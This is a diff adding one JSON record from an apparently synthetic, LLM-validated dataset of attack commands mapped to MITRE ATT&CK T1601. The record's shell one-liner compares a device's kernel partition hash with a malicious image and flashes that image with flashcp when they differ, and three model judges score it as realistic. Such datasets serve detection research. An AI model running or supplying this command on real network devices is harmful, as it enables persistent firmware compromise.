@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 verify+conditional patch: replace kernel if hash differs'; sha256sum /tmp/mal_kernel.bin | cut -d' ' -f1 > /tmp/mal.sha && dd if=/dev/mtdblock2 bs=1M count=8 2>/dev/null | sha256sum | cut -d' ' -f1 | cmp - /tmp/mal.sha || (flashcp -v /tmp/mal_kernel.bin /dev/mtd2 && sync)",
+  "explanation": "Compares the current kernel partition hash to a malicious image and conditionally flashes the malicious kernel if they differ, ensuring controlled image modification.",
+  "rationale_steps": [
+    "Compute the expected hash of the attacker’s kernel image.",
+    "Hash the on-device kernel partition to detect mismatch.",
+    "If mismatched, flash the malicious kernel to modify the system image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-d6cdd5ca",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes and grouping, correct pipelines/redirections, and valid options and chaining.",
+        "semantic_score": 4,
+        "semantic_justification": "It conditionally replaces the kernel partition using hash comparison and flashcp, aligning with T1601 on embedded devices, but assumes root privileges and a fixed 8 MiB size which may not universally match.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:16:25.917388Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with balanced parentheses, proper use of pipes, logical operators, and semicolons, though the `cmp - /tmp/mal.sha` comparison logic is slightly awkward (cmp reads from stdin and a file, but the order and piping are valid) and the overall pipeline is complex but parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a conditional firmware flash by hashing the malicious image, comparing it against the current MTD partition's hash, and only invoking `flashcp` to write to the MTD device if they differ — accurately reflecting T1601 firmware modification on network devices — though the privilege claim of 'None' is unrealistic since MTD flash operations and raw device access require root privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T01:17:42.140198Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper shell operators, piping, and command grouping without any syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The logic correctly compares the hash of a target partition with a file and uses flashcp to modify the system image, which is a highly realistic implementation of T1601 on embedded Linux devices.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:17:44.187980Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
